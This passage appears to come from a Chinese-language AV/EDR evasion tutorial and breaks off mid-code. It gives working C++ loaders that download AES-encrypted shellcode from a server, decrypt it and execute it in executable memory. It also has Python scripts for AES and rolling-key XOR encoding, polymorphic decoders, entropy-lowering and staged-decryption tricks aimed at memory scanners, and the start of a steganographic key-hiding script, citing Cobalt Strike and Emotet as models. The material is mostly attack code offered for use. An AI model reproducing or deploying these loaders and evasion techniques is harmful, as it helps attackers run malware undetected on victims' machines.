<h3 id="AES的关键概念"><a href="#AES的关键概念" class="headerlink" title="AES的关键概念"></a><strong>AES的关键概念</strong></h3><ul>
<li><p><strong>AES-128, AES-192, AES-256</strong>：不同的密钥长度（单位：比特）。</p>
</li>
<li><p><strong>ECB（电子密码本）模式</strong>：简单但不安全，容易使用。</p>
</li>
<li><p><strong>CBC（密文分组链接）模式</strong>：更强大，使用初始化向量（IV）。</p>
</li>
<li><p><strong>CTR（计数器模式）</strong>：像流密码一样工作，适合处理shellcode。</p>
</li>
</ul>
<p>为了简化，我们将使用<strong>AES-128 CBC模式</strong>，结合Windows CryptoAPI（<code>CryptEncrypt</code> &#x2F; <code>CryptDecrypt</code>）进行实现，Linux版本可以选择使用OpenSSL库。</p>
<hr>
<h3 id="C-使用CryptoAPI实现AES加载器"><a href="#C-使用CryptoAPI实现AES加载器" class="headerlink" title="C++ 使用CryptoAPI实现AES加载器"></a><strong>C++ 使用CryptoAPI实现AES加载器</strong></h3><p>此加载器：</p>
<ol>
<li><p>从远程URL下载AES加密的shellcode。</p>
</li>
<li><p>使用AES-CBC进行解密。</p>
</li>
<li><p>在内存中分配空间并执行它。</p>
</li>
</ol>
<blockquote>
<p>假设有效负载已经在离线时使用相同的密钥和IV进行了AES加密。</p>
</blockquote>
<hr>
<h3 id="步骤：加载器代码"><a href="#步骤：加载器代码" class="headerlink" title="步骤：加载器代码"></a><strong>步骤：加载器代码</strong></h3><h4 id="1-包含依赖"><a href="#1-包含依赖" class="headerlink" title="1. 包含依赖"></a><strong>1. 包含依赖</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;wininet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;wincrypt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;wininet.lib&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;advapi32.lib&quot;</span>)</span><br></code></pre></td></tr></table></figure>

<h4 id="2-AES解密函数"><a href="#2-AES解密函数" class="headerlink" title="2. AES解密函数"></a><strong>2. AES解密函数</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">aes_decrypt</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt;&amp; data, <span class="hljs-type">const</span> BYTE* key, <span class="hljs-type">const</span> BYTE* iv)</span> </span>&#123;<br>    HCRYPTPROV hProv = <span class="hljs-literal">NULL</span>;<br>    HCRYPTKEY hKey = <span class="hljs-literal">NULL</span>;<br>    HCRYPTHASH hHash = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CryptAcquireContext</span>(&amp;hProv, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CryptCreateHash</span>(hProv, CALG_SHA_256, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;hHash)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CryptHashData</span>(hHash, key, <span class="hljs-number">16</span>, <span class="hljs-number">0</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CryptDeriveKey</span>(hProv, CALG_AES_128, hHash, CRYPT_EXPORTABLE, &amp;hKey)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-comment">// 设置IV</span><br>    CRYPT_DATA_BLOB blob = &#123; <span class="hljs-number">16</span>, (BYTE*)iv &#125;;<br>    <span class="hljs-built_in">CryptSetKeyParam</span>(hKey, KP_IV, blob.pbData, <span class="hljs-number">0</span>);<br><br>    DWORD dataLen = data.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CryptDecrypt</span>(hKey, <span class="hljs-number">0</span>, TRUE, <span class="hljs-number">0</span>, data.<span class="hljs-built_in">data</span>(), &amp;dataLen)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    data.<span class="hljs-built_in">resize</span>(dataLen);<br>    <span class="hljs-built_in">CryptDestroyKey</span>(hKey);<br>    <span class="hljs-built_in">CryptDestroyHash</span>(hHash);<br>    <span class="hljs-built_in">CryptReleaseContext</span>(hProv, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="3-下载有效负载"><a href="#3-下载有效负载" class="headerlink" title="3. 下载有效负载"></a><strong>3. 下载有效负载</strong></h4><p>（与5.2中的逻辑相同）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">DownloadShellcode</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* url, std::vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt;&amp; data)</span> </span>&#123;<br>    HINTERNET hInternet = <span class="hljs-built_in">InternetOpenA</span>(<span class="hljs-string">&quot;Mozilla&quot;</span>, INTERNET_OPEN_TYPE_DIRECT, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!hInternet) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    HINTERNET hFile = <span class="hljs-built_in">InternetOpenUrlA</span>(hInternet, url, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, INTERNET_FLAG_RELOAD, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!hFile) &#123;<br>        <span class="hljs-built_in">InternetCloseHandle</span>(hInternet);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buffer[<span class="hljs-number">4096</span>];<br>    DWORD bytesRead = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">InternetReadFile</span>(hFile, buffer, <span class="hljs-built_in">sizeof</span>(buffer), &amp;bytesRead) &amp;&amp; bytesRead != <span class="hljs-number">0</span>) &#123;<br>        data.<span class="hljs-built_in">insert</span>(data.<span class="hljs-built_in">end</span>(), buffer, buffer + bytesRead);<br>    &#125;<br><br>    <span class="hljs-built_in">InternetCloseHandle</span>(hFile);<br>    <span class="hljs-built_in">InternetCloseHandle</span>(hInternet);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="4-主执行逻辑"><a href="#4-主执行逻辑" class="headerlink" title="4. 主执行逻辑"></a><strong>4. 主执行逻辑</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* url = <span class="hljs-string">&quot;http://yourserver.com/payload.aes&quot;</span>;<br>    BYTE key[<span class="hljs-number">16</span>] = &#123; <span class="hljs-comment">/* 16-byte key */</span> <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,<br>                     <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span> &#125;;<br>    BYTE iv[<span class="hljs-number">16</span>] = &#123; <span class="hljs-number">0</span> &#125;;  <span class="hljs-comment">// 也可以使用随机IV并将其添加到有效负载前面</span><br><br>    std::vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; encryptedShellcode;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">DownloadShellcode</span>(url, encryptedShellcode)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Download failed.\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">aes_decrypt</span>(encryptedShellcode, key, iv)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Decryption failed.\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    LPVOID exec = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-number">0</span>, encryptedShellcode.<span class="hljs-built_in">size</span>(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(exec, encryptedShellcode.<span class="hljs-built_in">data</span>(), encryptedShellcode.<span class="hljs-built_in">size</span>());<br><br>    ((<span class="hljs-built_in">void</span>(*)())exec)();  <span class="hljs-comment">// 执行shellcode</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="Python脚本加密shellcode"><a href="#Python脚本加密shellcode" class="headerlink" title="Python脚本加密shellcode"></a><strong>Python脚本加密shellcode</strong></h3><p>使用<code>pycryptodome</code>库：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">import</span> os<br><br>key = <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">16</span><br>iv = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">16</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shellcode.bin&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    sc = f.read()<br><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br>enc = cipher.encrypt(pad(sc, AES.block_size))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload.aes&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(enc)<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="AES有效负载封装的优点"><a href="#AES有效负载封装的优点" class="headerlink" title="AES有效负载封装的优点"></a><strong>AES有效负载封装的优点</strong></h3><ul>
<li><p>AV&#x2F;EDR中的误报率非常低</p>
</li>
<li><p>保持与良性二进制文件相似的熵</p>
</li>
<li><p>可以动态旋转密钥&#x2F;IV，针对每次部署</p>
</li>
<li><p>容易存储在离线或在线环境中</p>
</li>
</ul>
<hr>
<h3 id="真实世界的灵感"><a href="#真实世界的灵感" class="headerlink" title="真实世界的灵感"></a><strong>真实世界的灵感</strong></h3><ul>
<li><p><strong>Cobalt Strike</strong>：加密的有效负载（无阶段beacons）通常使用AES封装。</p>
</li>
<li><p><strong>Emotet和TrickBot</strong>：在加载器中使用AES + RC4组合。</p>
</li>
<li><p><strong>PowerShell Empire</strong>：也使用AES-CBC进行内存植入。</p>
</li>
</ul>
<h2 id="AV-EDR规避实用技术-5-4-使用密钥变异与多态性的XOR混淆"><a href="#AV-EDR规避实用技术-5-4-使用密钥变异与多态性的XOR混淆" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 5.4 - 使用密钥变异与多态性的XOR混淆"></a>AV&#x2F;EDR规避实用技术 - 5.4 - 使用密钥变异与多态性的XOR混淆</h2><h3 id="概述-5"><a href="#概述-5" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>XOR（异或）加密是一种轻量级的方法，通过使用密钥应用可逆的转换来混淆有效负载。结合<strong>密钥变异</strong>（在编码过程中更改密钥）和<strong>多态性</strong>（变更解密过程结构），XOR加密在对抗基于签名的AV&#x2F;EDR引擎时表现得异常有效。</p>
<hr>
<h3 id="为何XOR仍然有效"><a href="#为何XOR仍然有效" class="headerlink" title="为何XOR仍然有效"></a><strong>为何XOR仍然有效</strong></h3><p>虽然XOR看似简单，但它依然有效：</p>
<ul>
<li><p>AV引擎通常不会标记XOR本身，而是会标记已知的模式。</p>
</li>
<li><p>多态性通过改变解密过程打破了检测。</p>
</li>
<li><p>密钥变异使每个有效负载都独一无二。</p>
</li>
</ul>
<h3 id="常见使用XOR的恶意软件"><a href="#常见使用XOR的恶意软件" class="headerlink" title="常见使用XOR的恶意软件"></a><strong>常见使用XOR的恶意软件</strong></h3><ul>
<li><p><strong>AgentTesla</strong>、<strong>Redline Stealer</strong> 和旧版本的 <strong>Metasploit</strong> 有效负载依赖于XOR加密，并做一些细微变动。</p>
</li>
<li><p><strong>高级投放器</strong> 使用旋转密钥或动态编码。</p>
</li>
</ul>
<hr>
<h3 id="逐步实现带有密钥变异的XOR加密"><a href="#逐步实现带有密钥变异的XOR加密" class="headerlink" title="逐步实现带有密钥变异的XOR加密"></a><strong>逐步实现带有密钥变异的XOR加密</strong></h3><h3 id="1-加密脚本（Python）"><a href="#1-加密脚本（Python）" class="headerlink" title="1. 加密脚本（Python）"></a><strong>1. 加密脚本（Python）</strong></h3><p>此脚本将：</p>
<ul>
<li><p>接收一个shellcode文件</p>
</li>
<li><p>使用变化的密钥对其进行XOR编码（每个字节使用不同的密钥）</p>
</li>
<li><p>输出编码后的缓冲区和C++解码器逻辑</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_mutate</span>(<span class="hljs-params">data, seed=<span class="hljs-number">0x55</span></span>):<br>    encoded = []<br>    key = seed<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        encoded_byte = byte ^ key<br>        encoded.append(encoded_byte)<br>        key = (key + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>  <span class="hljs-comment"># 密钥变异逻辑</span><br>    <span class="hljs-keyword">return</span> encoded<br><br><span class="hljs-comment"># 载入shellcode</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;shellcode.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    shellcode = f.read()<br><br>encoded = xor_mutate(shellcode, seed=<span class="hljs-number">0x55</span>)<br><br><span class="hljs-comment"># 生成C++数组</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unsigned char payload[] = &#123;&quot;</span>)<br><span class="hljs-keyword">for</span> i, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(encoded):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;0x<span class="hljs-subst">&#123;b:02x&#125;</span>,&quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">16</span> == <span class="hljs-number">15</span>:<br>        <span class="hljs-built_in">print</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;int payload_len = sizeof(payload);&quot;</span>)<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="2-C-解码器（多态性）"><a href="#2-C-解码器（多态性）" class="headerlink" title="2. C++解码器（多态性）"></a><strong>2. C++解码器（多态性）</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> payload[] = &#123;<br>    <span class="hljs-comment">// 复制编码后的shellcode</span><br>&#125;;<br><br><span class="hljs-type">int</span> payload_len = <span class="hljs-built_in">sizeof</span>(payload);<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">xor_decode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* data, <span class="hljs-type">int</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> seed)</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key = seed;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; ++i) &#123;<br>        data[i] ^= key;<br>        key = (key + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>; <span class="hljs-comment">// 必须匹配Python中的密钥变异逻辑</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 分配并解码有效负载</span><br>    LPVOID exec = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-number">0</span>, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(exec, payload, payload_len);<br><br>    <span class="hljs-comment">// 就地解密</span><br>    <span class="hljs-built_in">xor_decode</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)exec, payload_len, <span class="hljs-number">0x55</span>);<br><br>    <span class="hljs-comment">// 执行解密后的shellcode</span><br>    ((<span class="hljs-built_in">void</span>(*)())exec)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="密钥变异的解释"><a href="#密钥变异的解释" class="headerlink" title="密钥变异的解释"></a><strong>密钥变异的解释</strong></h3><ul>
<li><p>从种子 <code>0x55</code> 开始</p>
</li>
<li><p>每个字节的密钥递增1</p>
</li>
<li><p>足够简单，以便在运行时解码</p>
</li>
<li><p>很难通过签名检测，因为每次XOR的密钥都不同</p>
</li>
</ul>
<hr>
<h3 id="多态性技术"><a href="#多态性技术" class="headerlink" title="多态性技术"></a><strong>多态性技术</strong></h3><p>为了进一步变化解密器：</p>
<ul>
<li><p>将解密逻辑内联，而不是调用函数。</p>
</li>
<li><p>将密钥或shellcode反向编码。</p>
</li>
<li><p>随机化寄存器使用和解密逻辑结构。</p>
</li>
</ul>
<h4 id="示例：内联解码器变化"><a href="#示例：内联解码器变化" class="headerlink" title="示例：内联解码器变化"></a>示例：内联解码器变化</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, k = <span class="hljs-number">0x55</span>; i &lt; payload_len; ++i, ++k)<br>    ((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)exec)[i] ^= k;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="真实世界的恶意软件使用案例"><a href="#真实世界的恶意软件使用案例" class="headerlink" title="真实世界的恶意软件使用案例"></a><strong>真实世界的恶意软件使用案例</strong></h3><p>**RedLine Stealer (2021)**：</p>
<ul>
<li><p>使用旋转密钥的XOR编码配置数据。</p>
</li>
<li><p>加载器使用多态解密器解密配置文件。</p>
</li>
</ul>
<p><strong>Lokibot</strong>：</p>
<ul>
<li>每个受害者实例使用动态XOR密钥，避免基于模式的检测。</li>
</ul>
<hr>
<h3 id="AV检测挑战"><a href="#AV检测挑战" class="headerlink" title="AV检测挑战"></a><strong>AV检测挑战</strong></h3><ul>
<li><p>XOR加密的有效负载不会匹配常见的shellcode签名。</p>
</li>
<li><p>密钥变异和解密器逻辑的变化可以防止静态模式检测。</p>
</li>
<li><p>解密通常发生在执行前的即时解密（JIT）。</p>
</li>
</ul>
<hr>
<p>接下来我们将深入探讨<strong>5.4模块</strong>：</p>
<ol>
<li><p><strong>运行时降低熵的技术</strong> — 以避开内存扫描器。</p>
</li>
<li><p><strong>将XOR密钥嵌入图像或PE节</strong> — 提高隐蔽性和OPSEC。</p>
</li>
</ol>
<hr>
<h3 id="1-运行时降低熵的技术"><a href="#1-运行时降低熵的技术" class="headerlink" title="1. 运行时降低熵的技术"></a><strong>1. 运行时降低熵的技术</strong></h3><p><strong>目标</strong>：使shellcode&#x2F;内存在扫描时看起来“正常”，从而避免AV&#x2F;EDR引擎因检测到<strong>高熵</strong>（常见的shellcode签名）而产生警报。</p>
<h4 id="为什么熵很重要"><a href="#为什么熵很重要" class="headerlink" title="为什么熵很重要"></a>为什么熵很重要</h4><p>高熵（接近8.0） &#x3D; 高度随机 &#x3D; 可疑。<br>内存扫描工具通常会在以下情况下报警：</p>
<ul>
<li><p>加密的负载</p>
</li>
<li><p>压缩的有效负载</p>
</li>
<li><p>内存中的shellcode</p>
</li>
</ul>
<hr>
<h3 id="技术A：零填充和结构仿真"><a href="#技术A：零填充和结构仿真" class="headerlink" title="技术A：零填充和结构仿真"></a><strong>技术A：零填充和结构仿真</strong></h3><p>通过添加NOPs或零字节来降低熵：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 解密之前，使用低熵字节填充内存</span><br><span class="hljs-built_in">memset</span>(exec, <span class="hljs-number">0x00</span>, payload_len);<br><br><span class="hljs-comment">// 然后解密</span><br><span class="hljs-built_in">xor_decode</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)exec, payload_len, <span class="hljs-number">0x55</span>);<br></code></pre></td></tr></table></figure>

<p>你还可以模仿正常的PE或堆分配结构：</p>
<ul>
<li><p>添加虚拟头部</p>
</li>
<li><p>附加可读字符串或正常数据</p>
</li>
</ul>
<hr>
<h3 id="技术B：渐进式解密（JIT解密）"><a href="#技术B：渐进式解密（JIT解密）" class="headerlink" title="技术B：渐进式解密（JIT解密）"></a><strong>技术B：渐进式解密（JIT解密）</strong></h3><p>与一次性解密所有shellcode不同，仅解密即将执行的部分：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, key = <span class="hljs-number">0x55</span>; i &lt; payload_len; i += <span class="hljs-number">4</span>) &#123;<br>    DWORD oldProtect;<br>    <span class="hljs-built_in">VirtualProtect</span>((LPVOID)((<span class="hljs-type">uintptr_t</span>)exec + i), <span class="hljs-number">4</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span> &amp;&amp; (i + j) &lt; payload_len; ++j)<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)exec)[i + j] ^= key + j;<br>    <span class="hljs-built_in">VirtualProtect</span>((LPVOID)((<span class="hljs-type">uintptr_t</span>)exec + i), <span class="hljs-number">4</span>, oldProtect, &amp;oldProtect);<br>    <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">50</span>); <span class="hljs-comment">// 模拟实时行为</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>这种方法模仿真实进程，避免产生大的熵波动。</p>
<hr>
<h3 id="2-将XOR密钥嵌入图像或PE节"><a href="#2-将XOR密钥嵌入图像或PE节" class="headerlink" title="2. 将XOR密钥嵌入图像或PE节"></a><strong>2. 将XOR密钥嵌入图像或PE节</strong></h3><h4 id="A-将XOR密钥嵌入图像（隐写方法）"><a href="#A-将XOR密钥嵌入图像（隐写方法）" class="headerlink" title="A. 将XOR密钥嵌入图像（隐写方法）"></a><strong>A. 将XOR密钥嵌入图像（隐写方法）</strong></h4><p>你可以将XOR密钥隐藏在图像的<strong>最低有效位</strong>（LSB）中。</p>
<h5 id="Python示例：将XOR密钥隐藏在PNG图像中："><a href="#Python示例：将XOR密钥隐藏在PNG图像中：" class="headerlink" title="Python示例：将XOR密钥隐藏在PNG图像中："></a>Python示例：将XOR密钥隐藏在PNG图像中：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>key = [<span class="hljs-number">0x55</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x58</span>]<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;template.png&quot;</span>)<br>pixels = img.load()<br><br><span class="hljs-keyword">for</span> i <span 